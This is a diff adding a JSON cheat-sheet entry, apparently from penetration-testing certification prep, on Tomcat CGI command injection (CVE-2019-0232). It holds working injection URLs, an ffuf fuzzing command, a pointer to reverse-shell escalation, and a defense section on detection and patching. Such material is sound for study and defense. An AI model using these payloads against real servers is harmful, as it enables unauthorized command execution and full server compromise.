@@ -1,0 +1,101 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "ffuf",
+    "curl"
+  ],
+  "tags": [
+    "cgi",
+    "command-injection",
+    "windows"
+  ],
+  "category": "Exploitation",
+  "subcategory": "CGI Applications",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Dump environment variables via set (confirms RCE and reveals paths)",
+      "command": "http://10.129.205.30:8080/cgi/welcome.bat?&set"
+    },
+    {
+      "label": "Fuzz for .bat CGI scripts under /cgi",
+      "command": "ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat"
+    },
+    {
+      "label": "Inject a command by appending to the CGI URL",
+      "command": "http://10.129.205.30:8080/cgi/welcome.bat?&dir"
+    },
+    {
+      "label": "URL-encode the payload to bypass filtering",
+      "command": "http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
+    }
+  ],
+  "notes": "Windows-only quirk: the CGI Servlet passes the query string to cmd.exe, so &dir or a full path to whoami.exe executes. URL-encode the payload when special characters get filtered.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "shellshock",
+      "note": "The other classic CGI attack (Bash env-var injection).",
+      "rel": "alternative"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Escalate command injection to a reverse shell.",
+      "rel": "escalation"
+    },
+    {
+      "id": "verb-tampering-filter-bypass",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "tomcat-cgi-injection",
+  "name": "Tomcat CGI - Command Injection (.bat/.cmd)",
+  "command": "http://<ip>:8080/cgi/welcome.bat?&<command>",
+  "description": "Windows CGI batch/cmd scripts pass query data to the shell. Fuzz for .bat/.cmd scripts, then append &<command> to execute OS commands (URL-encode as needed).",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Tomcat's CGI servlet (CVE-2019-0232, Windows only) passes URL query parameters as command-line arguments to cmd.exe via Runtime.exec(). Special characters in the query string inject additional commands into the argument list.",
+    "prerequisites": "Tomcat CGI servlet enabled on Windows. A .bat or .cmd CGI script in /cgi/. enableCmdLineArguments=true (default pre-fix).",
+    "impact": "Unauthenticated command injection as the Tomcat service user. Full Windows server compromise.",
+    "detection": "HTTP GET to /cgi/*.bat?& with injected commands. Windows Security Event 4688: new process created by Tomcat service. IDS alert for CGI command injection payload.",
+    "artifacts": "Tomcat access_log (GET /cgi/welcome.bat?&dir) | Windows Security Event 4688 | IDS alert for CGI injection pattern",
+    "prevention": "Update Tomcat to 9.0.18+, 8.5.40+. Set enableCmdLineArguments=false. Remove all CGI scripts if not required. Disable CGI servlet.",
+    "misconfiguration": "Tomcat CGI servlet enabled on Windows with enableCmdLineArguments=true. /cgi/ directory contains .bat files accessible from internet.",
+    "vulnerable_config": "<!-- web.xml vulnerable config -->\n<init-param>\n  <param-name>enableCmdLineArguments</param-name>\n  <param-value>true</param-value>\n</init-param>",
+    "secure_config": "<!-- Disable command line args -->\n<init-param>\n  <param-name>enableCmdLineArguments</param-name>\n  <param-value>false</param-value>\n</init-param>",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1059",
+      "OWASP A03:2021"
+    ]
+  }
+}
